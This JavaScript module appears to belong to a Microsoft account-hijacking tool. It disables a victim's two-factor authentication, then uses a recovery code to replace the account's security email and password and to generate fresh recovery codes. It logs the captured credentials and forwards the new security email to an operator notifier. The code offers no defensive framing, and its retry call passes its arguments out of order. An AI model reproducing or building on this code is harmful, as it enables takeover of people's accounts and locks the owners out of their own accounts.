const disableTfa = require("../secure/disableTfa");
const autonotifier = require("../secure/recode/autonotifier");
const recoveryCodeSecure = require("../secure/recoveryCodeSecure");
const recoveryCode = require("../secure/recoveryCode");


/*
Semi-Secures using recovery code with built-in prot
*/


// Needs more prot







module.exports = async function handlerecsecure(disabledtfa, axios, netid, email, recovery, secEmail, password, settings, apiCanary, tokenobj, retry = 0) {
            console.log(`Netid at handlerecsecure: ${netid}`)
    
    
    if (!disabledtfa){
            console.log(`Retrying to disable 2FA as required`)
            await disableTfa(axios)
        }
    
    console.time("recoveryTime");
    let acc = {
        email: email,
        secEmail: null,
        password: null,
        recoveryCode: null
    };

    let newData = await recoveryCodeSecure(acc.email, recovery, secEmail, password, false);

    if (typeof newData === "string" && newData === "same" || typeof newData === "object" && (newData?.recoveryCode.includes("couldn't create") || newData?.recoveryCode.includes("We couldn't create a new recovery code."))) {
        console.log(`Microsoft didn't give us the recovery code, great. Generating new one.`);
        acc.secEmail = secEmail;
        acc.password = password;
    console.time("Generate new recovery after failed recsec");
    acc.recoveryCode = await recoveryCode(axios, netid, apiCanary, tokenobj);
    console.timeEnd("Generate new recovery after failed recsec");
    } else if (typeof newData === "string" && newData === "tfa") {
        console.log(`Cannot secure: 2FA is enabled`);
        if (retry < 1) {
            console.log(`Retrying recovery, disabling 2FA.`);
            try {
                await disableTfa(axios);
            } catch (err) {
                console.log(`Error disabling 2FA: ${err.message}`);
            }
            return await handlerecsecure(axios, netid, email, recovery, secEmail, password, settings, retry + 1);
        } else {
            console.log(`Couldn't recsecure due to 2FA.`);
            let fallbackrec = await recoveryCode(axios, netid, apiCanary, tokenobj);
            console.log(`Fallback recovery: ${fallbackrec}`)
            acc.recoveryCode = `${fallbackrec || "none"} (Failed to remove 2FA)`;
            /// Maybe add zyger or smth so you can recover
        }
    } else if (typeof newData === "object" && newData !== null) {
        console.log(`Got details: ${JSON.stringify(newData)}`)
        acc.secEmail = newData.secEmail;
        acc.password = newData.password;
        if (newData.recoveryCode) {
            acc.recoveryCode = newData.recoveryCode;
        } else {
            acc.recoveryCode = await recoveryCode(axios, netid, apiCanary, tokenobj);
        }
    }

    console.timeEnd("recoveryTime");

if (acc.secEmail && acc.secEmail.includes("@")) {      /// idk maybe smth funny will happen
    try {   
        await autonotifier(settings.subscribemail, settings.user_id, acc.secEmail);
    } catch (err) {
        console.error(`autonotifier: ${err}`);
    }
}
    return acc;
};
